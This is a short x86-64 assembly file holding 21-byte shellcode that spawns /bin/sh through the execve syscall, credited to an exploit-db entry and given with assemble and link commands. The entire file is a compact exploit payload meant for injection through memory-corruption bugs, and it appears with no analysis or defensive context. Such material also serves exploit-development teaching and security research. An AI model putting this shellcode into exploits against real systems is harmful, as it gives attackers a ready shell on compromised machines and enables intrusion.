/* 
* execve("/bin/sh", NULL, NULL) - 21 bytes
* Source: https://www.exploit-db.com/exploits/41750
*/

.section .text
.global _start

// assembler + linker 
// as --64 -o execve_x64.o small_bin_sh.s && ld -o execve_x64 execve_x64.o

_start:
    mul    %esi              # rax = rdx = 0 (esi = 0 at startup)
    push   %rax              # push NULL terminator
    movabs $0x68732f2f6e69622f, %rdi  # "/bin//sh" (// = /)
    push   %rdi              # push "/bin//sh" on stack
    mov    %rsp, %rdi        # rdi = pointer to "/bin//sh"
    mov    $59, %al          # syscall execve (59)
    syscall
